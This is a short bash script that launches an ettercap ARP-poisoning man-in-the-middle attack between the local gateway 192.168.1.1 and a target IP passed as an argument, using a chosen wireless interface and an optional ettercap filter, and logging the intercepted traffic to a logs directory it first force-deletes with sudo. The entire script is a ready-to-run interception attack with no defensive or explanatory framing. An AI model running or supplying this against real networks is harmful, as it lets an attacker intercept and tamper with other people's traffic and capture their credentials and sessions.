#!/bin/bash

sudo rm -fr logs
sudo mkdir logs

interface='wlan0'
filter=''

count=1
while getopts "i:f:" arg
do
    case $arg in
        i)
            interface=$OPTARG
            let "count=$count+2"
            ;;
        f)
            filter='-F '$OPTARG
            let "count=$count+2"
            ;;
    esac
done

echo "-----------------------------------------------"
echo -e "\e[1;33m interface:$interface \e[0m"
echo -e "\e[1;33m filter: $filter \e[0m"
echo -e "\e[1;33m target: ${!count} \e[0m"
echo "-----------------------------------------------"

sudo ettercap -Tq -i $interface -L logs/log $filter -M arp:remote /192.168.1.1// /${!count}//

